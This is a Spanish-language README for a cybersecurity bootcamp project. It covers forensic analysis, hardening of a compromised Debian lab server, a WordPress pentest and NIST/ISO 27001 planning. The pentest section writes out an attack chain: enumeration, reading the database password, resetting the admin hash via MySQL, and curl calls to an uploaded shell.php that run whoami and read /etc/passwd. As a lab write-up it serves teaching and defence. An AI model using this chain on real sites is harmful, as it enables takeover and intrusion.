<div align="center">

# 🔐 Proyecto Final — Ciberseguridad
### Análisis Forense · Pentesting · ISO 27001
#### 4Geeks Academy Bootcamp · Mayo 2026

---

![Debian](https://img.shields.io/badge/Target-Debian%20Linux-A81D33?style=for-the-badge&logo=debian&logoColor=white)
![WordPress](https://img.shields.io/badge/Attack%20Surface-WordPress-21759B?style=for-the-badge&logo=wordpress&logoColor=white)
![Parrot OS](https://img.shields.io/badge/Attacker-Parrot%20OS-05A8E6?style=for-the-badge&logo=linux&logoColor=white)
![NIST](https://img.shields.io/badge/Framework-NIST%20SP%20800--61-003087?style=for-the-badge&logoColor=white)
![ISO 27001](https://img.shields.io/badge/Standard-ISO%2027001%3A2022-00447C?style=for-the-badge&logoColor=white)

---

![Status](https://img.shields.io/badge/Status-Completado-success?style=flat-square)
![Vulnerabilities](https://img.shields.io/badge/Vulnerabilities%20Found-5-critical?style=flat-square)
![Remediated](https://img.shields.io/badge/Remediated-100%25-brightgreen?style=flat-square)
![RCE](https://img.shields.io/badge/RCE-Confirmed-red?style=flat-square)
![Phase](https://img.shields.io/badge/Phases-3%2F3-blue?style=flat-square)

</div>

---

## 📋 Descripción del Proyecto

Proyecto final del Bootcamp de Ciberseguridad de **4Geeks Academy** en el que asumo el rol de **analista de ciberseguridad** encargado de restaurar y proteger un servidor Debian Linux comprometido. El ejercicio simula un escenario real de respuesta a incidente en un entorno empresarial.

El proyecto se divide en tres fases progresivas que demuestran competencias en análisis forense, pruebas de penetración y gestión de seguridad de la información.

---

## 🎯 Resumen Ejecutivo

| Indicador | Valor |
|-----------|-------|
| 🖥️ Sistema objetivo | Debian GNU/Linux 6.1.0-25-amd64 · `192.168.1.131` |
| 🔴 Vulnerabilidades críticas | **3** (FTP expuesto, RCE WordPress, credenciales BD en texto plano) |
| 🟠 Vulnerabilidades altas | **2** (Apache sin HTTPS, SSH sin hardening) |
| ⏱️ Tiempo de exposición estimado | **~10 meses** (julio 2024 – mayo 2025) |
| ✅ Remediación | **100%** — todas las vulnerabilidades corregidas y verificadas |
| ⚡ Tiempo para obtener RCE | **< 20 minutos** desde el reconocimiento inicial |

---

## 🗂️ Estructura del Repositorio

```
📁 proyecto-ciberseguridad-4geeks/
│
├── 📄 README.md                          ← Este archivo
│
├── 📁 fase1-forense/                     ← Análisis forense del servidor comprometido
│   ├── 📄 informe-incidente.md           ← Informe técnico completo
│   └── 📁 evidencias/                   ← Capturas de pantalla del análisis
│       ├── 01-usuarios-sistema.png
│       ├── 02-puertos-abiertos.png
│       ├── 03-logs-auth.png
│       ├── 04-remediacion-ftp.png
│       ├── 05-ssh-hardening.png
│       └── 06-verificacion-cierre.png
│
├── 📁 fase2-pentesting/                  ← Prueba de penetración WordPress
│   ├── 📄 informe-pentesting.md          ← Informe técnico completo
│   └── 📁 evidencias/                   ← Capturas del proceso de explotación
│       ├── 01-nmap-scan.png
│       ├── 02-wpscan-enum.png
│       ├── 03-wpconfig-credenciales.png
│       ├── 04-wp-admin-acceso.png
│       ├── 05-rce-whoami.png
│       └── 06-remediacion.png
│
├── 📁 fase3-gestion/                     ← Plan de respuesta + SGSI ISO 27001
│   ├── 📄 plan-respuesta-nist.md         ← Plan NIST SP 800-61
│   └── 📄 sgsi-iso27001.md              ← Sistema de Gestión de Seguridad
│
├── 📁 red/                               ← Topología de red
│   ├── 📄 diagrama-red.md               ← Descripción de la topología
│   └── 📄 topologia.png                 ← Diagrama Packet Tracer exportado
│
└── 📁 docs/                              ← Documentos formales
    ├── 📄 Informe_Incidente_Fase1.docx
    ├── 📄 Informe_Pentesting_Fase2.docx
    ├── 📄 PRI_SGSI_ISO27001_Fase3.docx
    └── 📄 Presentacion_Ejecutiva.pptx
```

---

## ⚔️ Fase 1 — Análisis Forense

> **Objetivo:** Identificar cómo fue comprometido el servidor, contener el incidente y aplicar medidas correctivas.

### Hallazgos identificados

| # | Hallazgo | Severidad | Puerto/Servicio |
|---|----------|-----------|-----------------|
| 1 | FTP expuesto transmitiendo credenciales en texto plano | 🔴 CRÍTICO | 21/tcp · vsftpd |
| 2 | Apache HTTP sin cifrado ni hardening | 🟠 ALTO | 80/tcp · Apache 2.4.67 |
| 3 | SSH sin restricciones de seguridad | 🟡 MEDIO | 22/tcp · OpenSSH 9.2p1 |
| 4 | CUPS (impresión) activo innecesariamente | 🟡 MEDIO | 631/tcp · cupsd |
| 5 | Logs con evidencia de actividad maliciosa desde julio 2024 | 🟠 ALTO | journalctl |

### Acciones de remediación ejecutadas

```bash
# 1. Deshabilitar FTP
systemctl stop vsftpd && systemctl disable vsftpd

# 2. Deshabilitar servicio de impresión
systemctl stop cups && systemctl disable cups

# 3. Hardening SSH
# /etc/ssh/sshd_config:
#   PermitRootLogin no
#   MaxAuthTries 3
#   LoginGraceTime 30
systemctl restart sshd

# 4. Actualizar sistema
apt update && apt upgrade -y

# 5. Cambiar contraseñas
passwd debian

# 6. Verificar cierre de puerto 21
ss -tulnp | grep :21  # Sin salida = Puerto cerrado ✅
```

---

## 🕵️ Fase 2 — Pentesting WordPress

> **Objetivo:** Identificar, explotar de forma controlada y remediar una vulnerabilidad diferente en el servidor.

### Cadena de ataque completa

```
Reconocimiento → Enumeración → Credenciales → Acceso BD → wp-admin → RCE
```

```
[Parrot OS 192.168.1.11]
        │
        │ nmap -sV -sC -O -p- 192.168.1.131
        │ → Puerto 80 abierto: WordPress 6.9.4
        │
        │ wpscan --url http://192.168.1.131 --enumerate u,p,t
        │ → Usuario: wordpress-user (via WP JSON API)
        │ → XML-RPC habilitado
        │
        │ cat /var/www/html/wp-config.php | grep DB_PASSWORD
        │ → DB_PASSWORD = '123456' ← CRÍTICO
        │
        │ mysql -u wordpressuser -p123456 wordpress
        │ → UPDATE wp_users SET user_pass=MD5('hacked123')...
        │
        │ http://192.168.1.131/wp-admin/ → ACCESO TOTAL
        │
        │ Plugin malicioso shell.php subido e instalado
        │
        ↓
[RCE CONFIRMADO]
curl "http://192.168.1.131/wp-content/plugins/shell/shell.php?cmd=whoami"
→ www-data

curl "http://192.168.1.131/wp-content/plugins/shell/shell.php?cmd=uname+-a"
→ Linux debian 6.1.0-47-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux

curl "http://192.168.1.131/wp-content/plugins/shell/shell.php?cmd=cat+/etc/passwd"
→ [Lectura completa del archivo]
```

### Vulnerabilidades explotadas

| CVE/CWE | Descripción | Impacto |
|---------|-------------|---------|
| CWE-200 | API REST sin autenticación — usuario enumerado | Enumeración de usuarios |
| CWE-256 | `DB_PASSWORD='123456'` en texto plano en wp-config.php | Acceso a base de datos |
| CWE-434 | Editor de plugins habilitado en wp-admin | **RCE confirmado** |
| CWE-749 | XML-RPC expuesto sin restricción | Vector de fuerza bruta |
| CWE-16  | `siteurl='localhost'` — misconfiguration de despliegue | Acceso restringido |

### Remediación aplicada

```bash
# Plugin malicioso eliminado
rm -rf /var/www/html/wp-content/plugins/shell/
# Verificación: curl → 404 ✅

# XML-RPC bloqueado en .htaccess
# <Files xmlrpc.php>
#   Order Deny,Allow
#   Deny from all
# </Files>

# Contraseña BD fortalecida
ALTER USER 'wordpressuser'@'localhost' IDENTIFIED BY 'Wordpress1234';

# Editor de archivos deshabilitado
# wp-config.php:
# define('DISALLOW_FILE_EDIT', true);
# define('DISALLOW_FILE_MODS', true);
```

---

## 🛡️ Fase 3 — Plan de Respuesta + SGSI ISO 27001

> **Objetivo:** Diseñar un plan de respuesta a incidentes y un Sistema de Gestión de Seguridad de la Información.

### Plan de Respuesta — NIST SP 800-61

| Fase | Actividades |
|------|-------------|
| 🔵 **Preparación** | Inventario de activos, herramientas forenses, contactos de respuesta |
| 🟡 **Detección y análisis** | Revisión de logs, IoCs identificados, análisis forense |
| 🟠 **Contención y erradicación** | Servicios detenidos, artefactos eliminados, credenciales revocadas |
| 🟢 **Recuperación** | Sistema actualizado, hardening aplicado, monitorización activada |

### SGSI — Controles ISO 27001:2022

| Control | Descripción | Estado |
|---------|-------------|--------|
| A.8.3 | Gestión de accesos privilegiados | ✅ Implementado |
| A.8.5 | Autenticación segura (2FA) | 🔄 Parcial |
| A.8.8 | Gestión de vulnerabilidades | 🔄 Parcial |
| A.8.13 | Backup cifrado de información | ⏳ Pendiente |
| A.8.15 | Registro y monitorización | ⏳ Pendiente |
| A.8.20 | Seguridad en redes (UFW) | ⏳ Pendiente |
| A.8.24 | Criptografía — HTTPS TLS 1.3 | ⏳ Pendiente |
| A.5.29 | Gestión de incidentes de seguridad | ✅ Implementado |

### Análisis de Riesgos (top 3)

| Riesgo | Prob. | Impacto | Nivel | Control |
|--------|-------|---------|-------|---------|
| FTP sin cifrado | 5/5 | 5/5 | 🔴 CRÍTICO 25 | Deshabilitar FTP → SFTP ✅ |
| RCE via plugin malicioso | 4/5 | 5/5 | 🔴 CRÍTICO 20 | DISALLOW_FILE_MODS ✅ |
| Credenciales BD en texto plano | 4/5 | 5/5 | 🔴 CRÍTICO 20 | Contraseña robusta ✅ |

---

## 🔧 Herramientas Utilizadas

<div align="center">

| Herramienta | Versión | Propósito |
|-------------|---------|-----------|
| ![Nmap](https://img.shields.io/badge/Nmap-7.95-blue?style=flat-square) | 7.95 | Reconocimiento y escaneo de puertos |
| ![WPScan](https://img.shields.io/badge/WPScan-3.8.28-red?style=flat-square) | 3.8.28 | Enumeración y auditoría WordPress |
| ![Metasploit](https://img.shields.io/badge/Metasploit-6.x-blue?style=flat-square) | 6.x | Framework de explotación |
| ![Parrot OS](https://img.shields.io/badge/Parrot%20OS-Attacker-05A8E6?style=flat-square) | Latest | Sistema operativo atacante |
| ![Debian](https://img.shields.io/badge/Debian-Victim-A81D33?style=flat-square) | 12 Bookworm | Sistema objetivo |
| ![MySQL](https://img.shields.io/badge/MariaDB-10.11-blue?style=flat-square) | 10.11 | Base de datos WordPress |
| ![Packet Tracer](https://img.shields.io/badge/Packet%20Tracer-Diagrama-1BA0D7?style=flat-square) | 8.x | Diagramas de red |

</div>

---

## 📐 Topología de Red

```
ANTES (Red comprometida)              DESPUÉS (Red segura)
─────────────────────                 ──────────────────────
     Internet                              Internet
         │                                     │
     [Switch]                            [Firewall UFW]
    /        \                          Puerto 22,80,443
[Parrot]  [Debian]                           │
 :11        :131                         [Switch]
         Puertos:                       /        \
         21(FTP)                   [Parrot]   [Debian]
         22(SSH)                    :11         :131
         80(HTTP)               VLAN lab    Puertos:
         631(CUPS)                          22(SSH hardened)
                                            443(HTTPS)
```

---

## 📄 Documentos

| Documento | Descripción |
|-----------|-------------|
| [📋 Informe Forense](./fase1-forense/informe-incidente.md) | Análisis forense completo — Fase 1 |
| [🕵️ Informe Pentesting](./fase2-pentesting/informe-pentesting.md) | Prueba de penetración WordPress — Fase 2 |
| [🛡️ Plan NIST + ISO 27001](./fase3-gestion/plan-respuesta-nist.md) | Plan de respuesta e incidentes — Fase 3 |
| [🌐 Diagrama de Red](./red/diagrama-red.md) | Topología antes y después |

---

## 🎓 Metodologías y Marcos de Referencia

- **[NIST SP 800-61 Rev. 2](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)** — Computer Security Incident Handling Guide
- **[ISO/IEC 27001:2022](https://www.iso.org/standard/82875.html)** — Information Security Management Systems
- **[PTES](http://www.pentest-standard.org/)** — Penetration Testing Execution Standard
- **[OWASP Top 10](https://owasp.org/Top10/)** — Web Application Security Risks
- **[CIS Controls v8](https://www.cisecurity.org/controls/)** — Center for Internet Security

---

## 👤 Autor

<div align="center">

**Bryan Calderón**
Ingeniero en Redes y Telecomunicaciones
Bootcamp de Ciberseguridad — 4Geeks Academy

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/tu-perfil)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tu-usuario)

</div>

---

<div align="center">

*Proyecto desarrollado con fines educativos en entorno de laboratorio controlado.*
*Todo el pentesting se realizó en sistemas propios con autorización explícita.*

**4Geeks Academy · Bootcamp de Ciberseguridad · 2026**

</div>
# análisis-y-remediación-de-amenazas
